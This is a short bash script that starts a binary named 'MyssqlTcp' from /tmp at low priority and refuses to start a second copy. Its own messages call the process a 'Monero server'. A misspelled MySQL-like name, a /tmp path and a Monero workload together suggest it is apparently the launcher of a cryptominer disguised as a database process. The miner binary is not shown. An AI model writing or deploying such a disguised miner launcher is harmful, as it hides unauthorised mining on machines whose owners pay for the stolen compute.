#!/bin/bash
if ! pidof MyssqlTcp >/dev/null; then
  nice /tmp/myssqltcp/MyssqlTcp \$*
else
  echo "Monero server is already running in the background. Refusing to run another one."
  echo "Run \"killall MyssqlTcp\" or \"sudo killall MyssqlTcp\" if you want to remove background server first."
fi
